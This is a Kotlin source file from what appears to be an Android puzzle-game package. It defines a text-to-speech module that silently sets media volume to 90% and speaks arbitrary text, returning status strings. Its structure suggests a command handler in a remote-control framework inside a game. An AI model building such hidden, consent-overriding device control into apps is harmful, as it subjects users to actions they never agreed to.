package com.puzzleblast.game.modules

import android.content.Context
import android.media.AudioManager
import android.speech.tts.TextToSpeech
import java.util.Locale

object TtsModule {
    suspend fun speak(ctx: Context, text: String): String {
        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        am.setStreamVolume(AudioManager.STREAM_MUSIC, (max * 0.9).toInt(), 0)
        var tts: TextToSpeech? = null
        return try {
            var done = false
            tts = TextToSpeech(ctx) { status ->
                if (status == TextToSpeech.SUCCESS) {
                    tts?.language = Locale.US
                    tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "msg")
                }
                done = true
            }
            var waited = 0
            while (!done && waited < 3000) { Thread.sleep(100); waited += 100 }
            Thread.sleep(2000 + text.length * 80L)
            "🔊 spoken"
        } catch (e: Exception) {
            "🔊 failed: ${e.message}"
        } finally {
            tts?.shutdown()
        }
    }
}
